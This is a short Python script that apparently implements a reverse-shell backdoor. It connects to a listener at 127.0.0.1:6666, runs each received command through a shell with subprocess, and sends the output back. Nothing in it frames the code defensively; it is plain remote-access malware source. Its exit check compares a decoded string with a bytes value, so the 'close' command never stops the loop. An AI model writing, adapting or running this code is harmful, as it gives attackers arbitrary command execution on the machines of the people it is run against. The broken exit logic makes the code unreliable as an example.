import socket, subprocess

# https://docs.python.org/fr/3/library/subprocess.html

ip = '127.0.0.1'
port = 6666

backdoor = socket.socket()
backdoor.connect((ip, port))

while True:
    command = backdoor.recv(1024)
    command = command.decode()
    if command == "close".encode():
        break
    process = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = process.stdout.read()
    output_error = process.stderr.read()
    backdoor.send(output + output_error)

backdoor.close()